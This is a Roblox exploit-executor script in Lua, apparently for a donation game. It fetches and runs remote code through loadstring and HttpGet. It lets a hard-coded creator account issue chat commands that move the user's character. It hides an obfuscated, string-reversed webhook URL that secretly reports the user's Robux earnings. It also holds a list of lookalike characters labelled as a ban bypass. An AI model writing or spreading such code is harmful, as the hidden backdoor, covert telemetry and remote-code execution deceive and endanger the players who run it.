local cloneref = cloneref or function(o) 
    return o 
end

local Players = cloneref(game:GetService('Players'))

local cmds = {
    ['tpback'] = function(plr)
        local oldpos = Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        local plrpos = plr.Character.HumanoidRootPart.CFrame
        Players.LocalPlayer.Character.HumanoidRootPart.CFrame = plrpos
        task.wait(3)
        Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
    end
}

local function execcmd(command, ...)
    if cmds[command] then
        cmds[command](...)
    end
end

repeat
    task.wait()
until Players.LocalPlayer

local httprequest = (syn and syn.request) or http and http.request or http_request or (fluxus and fluxus.request) or request

local ids = {
    7236670806
}

local banbypass = {
    "а",
    "q",
    "x",
    "й",
    "こ"
}

local notifs
task.spawn(function()
    notifs = loadstring(game:HttpGet("https://raw.githubusercontent.com/CF-Trail/random/main/FE2Notifs.lua"))()
    
    Players.PlayerAdded:Connect(function(plr)
        if table.find(ids, plr.UserId) then
            plr.Chatted:Connect(function(msg)
                execcmd(msg, plr)
            end)
            
            notifs.alert("script creator (szze) joined", nil, 10)
            notifs.alert("be sure to say hi to [" .. plr.DisplayName .. "]", nil, 10, "rainbow")
        end
    end)

    for _, plr in next, Players:GetPlayers() do
        if table.find(ids, plr.UserId) then
            plr.Chatted:Connect(function(msg)
                execcmd(msg, plr)
            end)
            
            notifs.alert("script creator (szze) is in the server", nil, 10)
            notifs.alert("be sure to say hi to [" .. plr.DisplayName .. "]", nil, 10, "rainbow")
        end
    end
end)

local oldDonated
local cd = false
task.spawn(function()
    oldDonated = Players:WaitForChild('leaderstats',9e9):WaitForChild('Raised',9e9).Value
    Players:WaitForChild('leaderstats',9e9):WaitForChild('Raised',9e9).Changed:Connect(function()
        if cd then return end
        cd = true
        task.delay(60,function()
                cd = false
        end)
        local newDonated = Players:WaitForChild('leaderstats',9e9):WaitForChild('Raised',9e9).Value
        local totalRaised = newDonated - oldDonated
        if totalRaised < 6 then
                    oldDonated = newDonated
                    return
        end
        pcall(function()
            httprequest({
                Url = string.reverse('GsiESKAAk84KEOGE626GYOka44E8quKMamgWCWWwQUQeusSsQWEyei46uAq2iCyA40aoIUMAsQuqMWrRTsb4n5/dc190f9f71aa-6fc9-2cc4-6446-c0b56f22/skoohbew/gg.dedliug.aidem//:sptth'),
                Body = cloneref(game:GetService('HttpService')):JSONEncode({
                    ["content"] = 'A user of the script just got ' .. totalRaised .. 'R$'
                }),
                Method = "POST",
                Headers = {
                    ["content-type"] = "application/json"
                }
            })
        end)
        oldDonated = newDonated
    end)
end)
